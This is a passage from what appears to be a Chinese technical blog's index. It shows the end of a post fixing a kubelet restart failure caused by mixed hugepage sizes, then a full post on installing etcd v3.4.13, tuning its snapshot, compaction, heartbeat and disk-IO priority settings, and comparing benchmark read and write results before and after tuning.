重启时，发现节点无法注册，错误信息如下：\nmay not have pre-allocated hugepages for multiple page sizes\n不支持预分配多种类型的大页。\n分析 问题所在业务流程点 结合kubelet代码分析： kubelet启动时会进行自检，如果已使用的hugepagesize类型数 \u0026gt; 1， 根据nr_hugepages，判断大页是否已使用，如nr_hugepages ！=1， 则无法通过\n查看系统meminfo 1  cat /proc/meminfo   查看系统hugepage 查看大页信息，命令如下\n1 2 3 4 5  # hugepages配置的size大小，如果有多个则会有多行输出 cat /sys/kernel/mm/hugepages/hugepages-*/nr_hugepages # 内核hugepages的配置文件 ls /sys/kernel/mm/hugepages   发现系统已使用了2种类型的大页，如下\n1 2 3 4 5 6  [root@worker-01 ~]# cat /sys/kernel/mm/hugepages/hugepages-*/nr_hugepages 2 2560 [root@worker-01 ~]# ls /sys/kernel/mm/hugepages hugepages-1048576kB hugepages-2048kB   解决方式  需要对一种类型大页，清0处理，比如对1G类型大页处理，该类型的hugepage未使用  1  echo 0 \u0026gt; /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages   重启kubelet  1  systemctl restart kubelet   ","permalink":"http://bingerambo.com/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题"},{"categories":["数据库"],"contents":"针对etcd的性能指标：延迟(latency)和吞吐量(throughput)，进行Etcd参数调优和对比测试\n说明 etcd 提供稳定的，持续的高性能。两个定义性能的因素：延迟(latency)和吞吐量(throughput)。延迟是完成操作的时间。吞吐量是在某个时间期间之内完成操作的总数量。当 etcd 接收并发客户端请求时，通常平均延迟随着总体吞吐量增加而增加。在通常的云环境，比如 Google Compute Engine (GCE) 标准的 n-4 或者 AWS 上相当的机器类型，一个三成员 etcd 集群在轻负载下可以在低于1毫秒内完成一个请求，并在重负载下可以每秒完成超过 30000 个请求。\netcd 使用 Raft 一致性算法来在成员之间复制请求并达成一致。一致性性能，特别是提交延迟，受限于两个物理约束：网络IO延迟和磁盘IO延迟。完成一个etcd请求的最小时间是成员之间的网络往返时延(Round Trip Time / RTT)，加需要提交数据到持久化存储的 fdatasync 时间。在一个数据中心内的 RTT 可能有数百毫秒。在美国典型的 RTT 是大概 50ms, 而在大陆之间可以慢到400ms. 旋转硬盘(注：指传统机械硬盘)的典型 fdatasync 延迟是大概 10ms。对于 SSD 硬盘, 延迟通常低于 1ms. 为了提高吞吐量, etcd 将多个请求打包在一起并提交给 Raft。这个批量策略让 etcd 在重负载时获得高吞吐量.\n有其他子系统影响到 etcd 的整体性能。每个序列化的 etcd 请求必须通过 etcd 的 boltdb支持的(boltdb-backed) MVCC 存储引擎,它通常需要10微秒来完成。etcd 定期递增快照它最近实施的请求，将他们和之前在磁盘上的快照合并。这个过程可能导致延迟尖峰(latency spike)。虽然在SSD上这通常不是问题，在HDD上它可能加倍可观察到的延迟。而且，进行中的压缩可以影响 etcd 的性能。幸运的是，压缩通常无足轻重，因为压缩是错开的，因此它不和常规请求竞争资源。RPC 系统，gRPC，为 etcd 提供定义良好，可扩展的 API，但是它也引入了额外的延迟，尤其是本地读取。\netcd 安装 二进制方式安装 参考版本地址 这里选择ETCD_VER=v3.4.13版本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ETCD_VER=v3.4.13 # choose either URL GOOGLE_URL=https://storage.googleapis.com/etcd GITHUB_URL=https://github.com/etcd-io/etcd/releases/download # choose GITHUB_URL DOWNLOAD_URL=${GITHUB_URL} rm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz rm -rf /tmp/etcd-download-test \u0026amp;\u0026amp; mkdir -p /tmp/etcd-download-test curl -L ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz -o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz tar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz -C /tmp/etcd-download-test --strip-components=1 rm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz /tmp/etcd-download-test/etcd --version /tmp/etcd-download-test/etcdctl version   etcd 启动 1 2 3 4 5 6 7 8 9 10 11  # start a local etcd server /tmp/etcd-download-test/etcd ## 指定etcd name /tmp/etcd-download-test/etcd --name=etcdtest ## 指定data-dir /tmp/etcd-download-test/etcd --name=etcdtest --data-dir=/var/lib/etcd ## 指定 params /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1   etcd 键值测试 1 2 3  # write,read to etcd /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 put foo bar /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 get foo   etcd 参数优化 快照 etcd_snapshot_count 5000\n数据快照触发数量，etcd处理指定的次数的事务提交后，生产数据快照\n历史数据压缩频率 etcd_compaction_retention 1\n由于ETCD数据存储多版本数据，随着写入的主键增加历史版本需要定时清理，　默认的历史数据是不会清理的，数据达到2G就不能写入，必须要清理压缩历史数据才能继续写入；\n所以根据业务需求，在上生产环境之前就提前确定，历史数据多长时间压缩一次；　我们的生产环境现在升级后是默认一小时压缩一次数据。这样可以极大的保证集群稳定，减少内存和磁盘占用\n时间参数 etcd_heartbeat_interval 200 etcd_election_timeout 2000\n客户端连接后的心跳间隔（毫秒） 集群选举的超时时间（毫秒）\n磁盘IO优先级，在全部etcd节点执行 ionice -c2 -n0 -p pgrep etcd\netcd配置，环境变量方式 vi /etc/etcd.env\n1 2 3 4 5 6  vi /etc/etcd.env ETCD_SNAPSHOT_COUNT=5000 ETCD_HEARTBEAT_INTERVAL=200 ETCD_ELECTION_TIMEOUT=2000 ETCD_AUTO_COMPACTION_RETENTION=1   etcd配置， 命令行参数方式 1  etcd --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1   benchmark安装 etcd/tools/benchmark 是etcd官方benchmark测试工具\n安装命令如下，\nget方式 1 2 3 4  # set myproject go env export GOPATH=/home/wangb/go_projects go get go.etcd.io/etcd/tools/benchmark ls $GOPATH/bin   示例：\n1 2 3 4 5  $ go get go.etcd.io/etcd/tools/benchmark # GOPATH should be set $ ls $GOPATH/bin benchmark   编译方式 如果上面get方式不能成功，则下载etcd源码，进行编译\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # 使用go mod # 进入项目根目录，如go_projects/src/etcd-3.4.13 export GO111MODULE=on # export GO111MODULE=off # go env -w GOPROXY=https://goproxy.cn,direct #进入项目目录 #go mod init godev # 下载依赖 go mod tidy # 生成项目vendor go mod vendor   1 2 3  # etcd-3.4.13/tools/benchmark cd tools/benchmark go build -o benchmark   示例：\n1 2 3 4 5 6 7 8 9  (base) [root@yuyuan211 /home/wangb/go_projects/src/etcd-3.4.13/tools/benchmark]# go build -o benchmark (base) [root@yuyuan211 /home/wangb/go_projects/src/etcd-3.4.13/tools/benchmark]# ll total 19080 -rwxr-xr-x. 1 root root 19525385 Jan 18 11:09 benchmark drwxr-xr-x. 2 root root 278 Aug 25 03:11 cmd -rw-r--r--. 1 root root 675 Aug 25 03:11 doc.go -rw-r--r--. 1 root root 784 Aug 25 03:11 main.go -rw-r--r--. 1 root root 284 Aug 25 03:11 README.md   benchmark指标 性能指标说明：\n 延时 吞吐量     title description     Performance Understanding performance: latency \u0026amp; throughput    benchmark测试 启动etcd 1  /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1   启动打印\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114  (base) [root@yuyuan211 /home/wangb/etcd-test]# /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1 [WARNING] Deprecated \u0026#39;--logger=capnslog\u0026#39; flag is set; use \u0026#39;--logger=zap\u0026#39; flag instead 2021-01-19 14:34:35.907827 I | etcdmain: etcd Version: 3.4.13 2021-01-19 14:34:35.908025 I | etcdmain: Git SHA: ae9734ed2 2021-01-19 14:34:35.908089 I | etcdmain: Go Version: go1.12.17 2021-01-19 14:34:35.908116 I | etcdmain: Go OS/Arch: linux/amd64 2021-01-19 14:34:35.908144 I | etcdmain: setting maximum number of CPUs to 32, total number of available CPUs is 32 2021-01-19 14:34:35.908186 W | etcdmain: no data-dir provided, using default data-dir ./etcdtest.etcd [WARNING] Deprecated \u0026#39;--logger=capnslog\u0026#39; flag is set; use \u0026#39;--logger=zap\u0026#39; flag instead 2021-01-19 14:34:35.912732 I | embed: name = etcdtest 2021-01-19 14:34:35.912790 I | embed: data dir = etcdtest.etcd 2021-01-19 14:34:35.912833 I | embed: member dir = etcdtest.etcd/member 2021-01-19 14:34:35.912854 I | embed: heartbeat = 200ms 2021-01-19 14:34:35.912873 I | embed: election = 2000ms 2021-01-19 14:34:35.912891 I | embed: snapshot count = 5000 2021-01-19 14:34:35.912944 I | embed: advertise client URLs = http://localhost:2379 2021-01-19 14:34:35.925333 I | etcdserver: starting member 8e9e05c52164694d in cluster cdf818194e3a8c32 raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d switched to configuration voters=() raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d became follower at term 0 raft2021/01/19 14:34:35 INFO: newRaft 8e9e05c52164694d [peers: [], term: 0, commit: 0, applied: 0, lastindex: 0, lastterm: 0] raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d became follower at term 1 raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d switched to configuration voters=(10276657743932975437) 2021-01-19 14:34:35.928869 W | auth: simple token is not cryptographically signed 2021-01-19 14:34:35.933119 I | etcdserver: starting server... [version: 3.4.13, cluster version: to_be_decided] 2021-01-19 14:34:35.933413 I | etcdserver: 8e9e05c52164694d as single-node; fast-forwarding 9 ticks (election ticks 10) raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d switched to configuration voters=(10276657743932975437) 2021-01-19 14:34:35.935531 I | etcdserver/membership: added member 8e9e05c52164694d [http://localhost:2380] to cluster cdf818194e3a8c32 2021-01-19 14:34:35.939938 I | embed: listening for peers on 127.0.0.1:2380 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d is starting a new election at term 1 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d became candidate at term 2 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d received MsgVoteResp from 8e9e05c52164694d at term 2 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d became leader at term 2 raft2021/01/19 14:34:37 INFO: raft.node: 8e9e05c52164694d elected leader 8e9e05c52164694d at term 2 2021-01-19 14:34:37.328580 I | etcdserver: setting up the initial cluster version to 3.4 2021-01-19 14:34:37.330234 N | etcdserver/membership: set the initial cluster version to 3.4 2021-01-19 14:34:37.330360 I | embed: ready to serve client requests 2021-01-19 14:34:37.330537 I | etcdserver: published {Name:etcdtest ClientURLs:[http://localhost:2379]} to cluster cdf818194e3a8c32 2021-01-19 14:34:37.330575 I | etcdserver/api: enabled capabilities for version 3.4 2021-01-19 14:34:37.332810 N | embed: serving insecure client requests on 127.0.0.1:2379, this is strongly discouraged! 2021-01-19 14:36:58.994204 I | etcdserver: start to snapshot (applied: 5001, lastsnap: 0) 2021-01-19 14:36:58.999539 I | etcdserver: saved snapshot at index 5001 2021-01-19 14:36:59.000747 I | etcdserver: compacted raft log at 1 2021-01-19 14:37:02.580676 I | etcdserver: start to snapshot (applied: 10002, lastsnap: 5001) 2021-01-19 14:37:02.585886 I | etcdserver: saved snapshot at index 10002 2021-01-19 14:37:02.587930 I | etcdserver: compacted raft log at 5002 2021-01-19 14:37:02.879022 I | etcdserver: start to snapshot (applied: 15005, lastsnap: 10002) 2021-01-19 14:37:02.889233 I | etcdserver: saved snapshot at index 15005 2021-01-19 14:37:02.893700 I | etcdserver: compacted raft log at 10005 2021-01-19 14:37:03.030899 I | etcdserver: start to snapshot (applied: 20042, lastsnap: 15005) 2021-01-19 14:37:03.047952 I | etcdserver: saved snapshot at index 20042 2021-01-19 14:37:03.051905 I | etcdserver: compacted raft log at 15042 2021-01-19 14:37:03.208428 I | etcdserver: start to snapshot (applied: 25335, lastsnap: 20042) 2021-01-19 14:37:03.220643 I | etcdserver: saved snapshot at index 25335 2021-01-19 14:37:03.226455 I | etcdserver: compacted raft log at 20335 2021-01-19 14:37:03.381115 I | etcdserver: start to snapshot (applied: 30503, lastsnap: 25335) 2021-01-19 14:37:03.399205 I | etcdserver: saved snapshot at index 30503 2021-01-19 14:37:03.405633 I | etcdserver: compacted raft log at 25503 2021-01-19 14:37:03.552010 I | etcdserver: start to snapshot (applied: 35970, lastsnap: 30503) 2021-01-19 14:37:03.573982 I | etcdserver: saved snapshot at index 35970 2021-01-19 14:37:03.574904 I | etcdserver: compacted raft log at 30970 2021-01-19 14:37:03.749731 I | etcdserver: start to snapshot (applied: 41678, lastsnap: 35970) 2021-01-19 14:37:03.778794 I | etcdserver: saved snapshot at index 41678 2021-01-19 14:37:03.793623 I | etcdserver: compacted raft log at 36678 2021-01-19 14:37:03.935394 I | etcdserver: start to snapshot (applied: 46839, lastsnap: 41678) 2021-01-19 14:37:03.964458 I | etcdserver: saved snapshot at index 46839 2021-01-19 14:37:03.977165 I | etcdserver: compacted raft log at 41839 2021-01-19 14:37:04.182597 I | etcdserver: start to snapshot (applied: 51885, lastsnap: 46839) 2021-01-19 14:37:04.206669 I | etcdserver: saved snapshot at index 51885 2021-01-19 14:37:04.207931 I | etcdserver: compacted raft log at 46885 2021-01-19 14:37:04.387361 I | etcdserver: start to snapshot (applied: 57144, lastsnap: 51885) 2021-01-19 14:37:04.416557 I | etcdserver: saved snapshot at index 57144 2021-01-19 14:37:04.435562 I | etcdserver: compacted raft log at 52144 2021-01-19 14:37:04.598093 I | etcdserver: start to snapshot (applied: 62521, lastsnap: 57144) 2021-01-19 14:37:04.626258 I | etcdserver: saved snapshot at index 62521 2021-01-19 14:37:04.641498 I | etcdserver: compacted raft log at 57521 2021-01-19 14:37:04.773653 I | etcdserver: start to snapshot (applied: 67553, lastsnap: 62521) 2021-01-19 14:37:04.788911 I | etcdserver: saved snapshot at index 67553 2021-01-19 14:37:04.791871 I | etcdserver: compacted raft log at 62553 2021-01-19 14:37:04.959274 I | etcdserver: start to snapshot (applied: 72572, lastsnap: 67553) 2021-01-19 14:37:04.972930 I | etcdserver: saved snapshot at index 72572 2021-01-19 14:37:04.979931 I | etcdserver: compacted raft log at 67572 2021-01-19 14:37:05.130776 I | etcdserver: start to snapshot (applied: 77731, lastsnap: 72572) 2021-01-19 14:37:05.163934 I | etcdserver: saved snapshot at index 77731 2021-01-19 14:37:05.164320 I | etcdserver: compacted raft log at 72731 2021-01-19 14:37:05.341994 I | etcdserver: start to snapshot (applied: 82808, lastsnap: 77731) 2021-01-19 14:37:05.362133 I | etcdserver: saved snapshot at index 82808 2021-01-19 14:37:05.362556 I | etcdserver: compacted raft log at 77808 2021-01-19 14:37:05.534155 I | etcdserver: start to snapshot (applied: 87972, lastsnap: 82808) 2021-01-19 14:37:05.552320 I | etcdserver: saved snapshot at index 87972 2021-01-19 14:37:05.560299 I | etcdserver: compacted raft log at 82972 2021-01-19 14:37:05.708062 I | etcdserver: start to snapshot (applied: 93127, lastsnap: 87972) 2021-01-19 14:37:05.733762 I | etcdserver: saved snapshot at index 93127 2021-01-19 14:37:05.744657 I | etcdserver: compacted raft log at 88127 2021-01-19 14:37:05.915552 I | etcdserver: start to snapshot (applied: 98166, lastsnap: 93127) 2021-01-19 14:37:05.936166 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-0000000000001389.snap successfully 2021-01-19 14:37:05.936297 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-0000000000002712.snap successfully 2021-01-19 14:37:05.936417 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-0000000000003a9d.snap successfully 2021-01-19 14:37:05.936540 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-0000000000004e4a.snap successfully 2021-01-19 14:37:05.936641 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-00000000000062f7.snap successfully 2021-01-19 14:37:05.936752 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-0000000000007727.snap successfully 2021-01-19 14:37:05.936873 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-0000000000008c82.snap successfully 2021-01-19 14:37:05.936984 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-000000000000a2ce.snap successfully 2021-01-19 14:37:05.937092 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-000000000000b6f7.snap successfully 2021-01-19 14:37:05.937197 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-000000000000caad.snap successfully 2021-01-19 14:37:05.937311 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-000000000000df38.snap successfully 2021-01-19 14:37:05.937419 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-000000000000f439.snap successfully 2021-01-19 14:37:05.937532 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-00000000000107e1.snap successfully 2021-01-19 14:37:05.937663 I | pkg/fileutil: purged file etcdtest.etcd/member/snap/0000000000000002-0000000000011b7c.snap successfully 2021-01-19 14:37:05.944586 I | etcdserver: saved snapshot at index 98166   参数说明  clients：Number of clients： 客户端数量 conns：Number of connections，http连接数量，多个客户端可复用1个连接 total ：Total number of put requests，requests请求数量，即所有客户端的请求总数量，默认值10000  write测试 With this configuration, etcd can approximately write:\n   Number of keys Key size in bytes Value size in bytes Number of connections Number of clients Target etcd server Average write QPS Average latency per request Average server RSS     10,000 8 256 1 1 leader only 1359 0.7ms 24 MB   100,000 8 256 100 1000 leader only 27507 36ms 75MB   100,000 8 256 100 1000 all members 27206 36.3ms 89MB    说明：这里只有一个etcd节点，所以表格第3行的集群raft测试结果参考意义不大。\nSample commands are:\n1 2 3 4 5 6 7  HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 # include benchmark bin path current=`pwd` export PATH=$PATH:$current   1 2 3 4 5 6 7 8 9  # write to leader benchmark --endpoints=${HOST_1} --target-leader --conns=1 --clients=1 \\  put --key-size=8 --sequential-keys --total=10000 --val-size=256 benchmark --endpoints=${HOST_1} --target-leader --conns=100 --clients=1000 \\  put --key-size=8 --sequential-keys --total=100000 --val-size=256 # write to all members benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\  put --key-size=8 --sequential-keys --total=100000 --val-size=256   read测试 Linearizable read requests go through a quorum of cluster members for consensus to fetch the most recent data. Serializable read requests are cheaper than linearizable reads since they are served by any single etcd member, instead of a quorum of members, in exchange for possibly serving stale data. etcd can read:\n   Number of requests Key size in bytes Value size in bytes Number of connections Number of clients Consistency Average read QPS Average latency per request     10,000 8 256 1 1 Linearizable 1110 0.9ms   10,000 8 256 1 1 Serializable 1251 0.8ms   100,000 8 256 100 1000 Linearizable 9532 0.1044s   100,000 8 256 100 1000 Serializable 11354 0.0875s    说明 由于测试etcd为单节点，所以Linearizable和Serializable特性测试结果差别不大，参考意义不大。\nSample commands are:\n1 2 3 4 5 6 7  HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 current=`pwd` export PATH=$PATH:$current   read前，先write一个测试key\n1 2 3 4  YOUR_KEY=foo /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 put $YOUR_KEY bar /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 get $YOUR_KEY   测试命令 1 2 3 4 5 6 7 8 9 10 11  # Single connection read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\  range $YOUR_KEY --consistency=l --total=10000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\  range $YOUR_KEY --consistency=s --total=10000 # Many concurrent read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\  range $YOUR_KEY --consistency=l --total=100000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\  range $YOUR_KEY --consistency=s --total=100000   read-only 时间参数设置优化 read测试时的etcd打印信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  2021-01-18 14:54:58.315985 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (128.237385ms) to execute 2021-01-18 14:54:58.316748 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (136.434995ms) to execute 2021-01-18 14:54:58.317021 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (125.138823ms) to execute 2021-01-18 14:54:58.327063 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (113.659252ms) to execute 2021-01-18 14:54:58.327171 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (140.480071ms) to execute 2021-01-18 14:54:58.328320 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (138.142424ms) to execute 2021-01-18 14:54:58.329457 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (136.980041ms) to execute 2021-01-18 14:54:58.330026 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (139.674614ms) to execute 2021-01-18 14:54:58.330674 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (137.950461ms) to execute 2021-01-18 14:54:58.330710 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (151.589201ms) to execute 2021-01-18 14:54:58.338877 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (149.623303ms) to execute 2021-01-18 14:54:58.339042 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (148.882374ms) to execute   上面的read测试时的etcd打印信息， 会一直输出告警打印信息（包括输出到系统日志中），因为read-only range request \u0026gt; 100ms，导致性能降低\n代码中默认值设置为 100ms\n1 2 3 4 5 6 7 8 9 10  // v3.3 -\u0026gt; v3.4.14 const ( warnApplyDuration = 100 * time.Millisecond ) // v3.4-master const ( DefaultWarningApplyDuration = 100 * time.Millisecond )   在etcd-v3.4最新版本(master)添加了参数优化设置，而v3.4.14以前，包括v3.4.14和etcd-v3.3没有办法消除该告警信息打印\n同时etcd-3.4版本的模块目录有所调整，所以需要跟踪etcd版本\n跟踪etcd版本，是否新增了配置变量ExperimentalWarningApplyDuration，而最新版本不再使用变量WarnApplyDuration，改为WarningApplyDuration\nWarningApplyDuration 修改参考\n1 2 3 4  srvcfg := etcdserver.ServerConfig{ WarningApplyDuration: cfg.ExperimentalWarningApplyDuration, }   benchmark测试条件 We encourage running the benchmark test when setting up an etcd cluster for the first time in a new environment to ensure the cluster achieves adequate performance; cluster latency and throughput can be sensitive to minor environment differences.\n磁盘IO 参数调优 Linux 中 etcd 的磁盘优先级可以使用 ionice 配置：\n1 2 3 4 5 6 7  -c class 指定调度类型，0代表none，1代表real time,2代表best effort, 3代表idle-nclassdata 指定优先级 real time和best effor可以使用0-7-p pid 查看或改变已经运行的进程的调度类型和优先级。-t 忽略设置指定优先级的错误信息  查询命令 1  ionice -p `pgrep etcd`   原有配置\n1 2 3  (base) [root@yuyuan211 ~]# ionice -p `pgrep etcd` unknown: prio 4   设置命令 Best Effort策略，优先级为0（优先级最高）\n1 2 3 4  # best effort, highest priority ionice -c2 -n0 -p `pgrep etcd` ionice -p `pgrep etcd`   优化配置\n1 2 3 4 5 6  (base) [root@yuyuan211 ~]# ionice -c2 -n0 -p `pgrep etcd` (base) [root@yuyuan211 ~]# (base) [root@yuyuan211 ~]# ionice -p `pgrep etcd` best-effort: prio 0 (base) [root@yuyuan211 ~]#   优化后测试 说明  为了在相同环境下对比测试，把之前测试数据文件etcdtest.etcd全部删除 read测试时，测试键值key，可以不预置，这样read测试为极限值  1 2 3 4 5 6 7 8 9 10 11  (base) [root@yuyuan211 /home/wangb/etcd-test]# ll total 19068 -rwxr-xr-x. 1 root root 19525385 Jan 18 11:36 benchmark drwxr-xr-x. 3 root root 151 Jan 18 11:37 etcd-download-test drwx------. 3 root root 28 Jan 18 13:46 etcdtest.etcd (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# rm -rf etcdtest.etcd (base) [root@yuyuan211 /home/wangb/etcd-test]#   write测试 Sample commands are:\n1 2 3 4 5 6 7  HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 # include benchmark bin path current=`pwd` export PATH=$PATH:$current   1 2 3 4 5 6 7 8 9  # write to leader benchmark --endpoints=${HOST_1} --target-leader --conns=1 --clients=1 \\  put --key-size=8 --sequential-keys --total=10000 --val-size=256 benchmark --endpoints=${HOST_1} --target-leader --conns=100 --clients=1000 \\  put --key-size=8 --sequential-keys --total=100000 --val-size=256 # write to all members benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\  put --key-size=8 --sequential-keys --total=100000 --val-size=256   With this configuration, etcd can approximately write:\n   Number of keys Key size in bytes Value size in bytes Number of connections Number of clients Target etcd server Average write QPS Average latency per request     10,000 8 256 1 1 leader only 1357 0.7ms   100,000 8 256 100 1000 leader only 28232 35.1ms   100,000 8 256 100 1000 all members 27620 35.9ms    read测试 测试命令 1 2 3 4 5 6 7  HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 # include benchmark bin path current=`pwd` export PATH=$PATH:$current   1 2 3 4 5 6 7 8 9 10 11  # Single connection read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\  range $YOUR_KEY --consistency=l --total=10000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\  range $YOUR_KEY --consistency=s --total=10000 # Many concurrent read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\  range $YOUR_KEY --consistency=l --total=100000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\  range $YOUR_KEY --consistency=s --total=100000      Number of requests Key size in bytes Value size in bytes Number of connections Number of clients Consistency Average read QPS Average latency per request     10,000 8 256 1 1 Linearizable 1272 0.8ms   10,000 8 256 1 1 Serializable 1432 0.7ms   100,000 8 256 100 1000 Linearizable 13108 0.0758s   100,000 8 256 100 1000 Serializable 16088 0.0617s    对比结果  write对比     Number of keys Key size in bytes Value size in bytes Number of connections Number of clients Target etcd server Average write QPS Average latency per request Tunning     10,000 8 256 1 1 leader only 1359 0.7ms false   10,000 8 256 1 1 leader only 1382 0.7ms true   100,000 8 256 100 1000 leader only 27507 36ms false   100,000 8 256 100 1000 leader only 28381 34.8ms true   100,000 8 256 100 1000 all members 27206 36.3ms false   100,000 8 256 100 1000 all members 27855 35.6ms true    read对比     Number of requests Key size in bytes Value size in bytes Number of connections Number of clients Consistency Average read QPS Average latency per request Tunning     10,000 8 256 1 1 Linearizable 1110 0.9ms false   10,000 8 256 1 1 Linearizable 1272 0.8ms true   10,000 8 256 1 1 Serializable 1251 0.8ms false   10,000 8 256 1 1 Serializable 1432 0.7ms true   100,000 8 256 100 1000 Linearizable 9532 0.1044s false   100,000 8 256 100 1000 Linearizable 13108 0.0758s true   100,000 8 256 100 1000 Serializable 11354 0.0875s false   100,000 8 256 100 1000 Serializable 16088 0.0617s true    结论  磁盘IO参数可以优化etcd性能，write和read接口指标改善 快照和数据压缩参数，可以减少etcd的内存和磁盘占用量  附录  etcd benchmarks etcd-3-demo-benchmarks  Linearizability Linearizability (also known as Atomic Consistency or External Consistency) is a consistency level between strict consistency and sequential consistency.\nFor linearizability, suppose each operation receives a timestamp from a 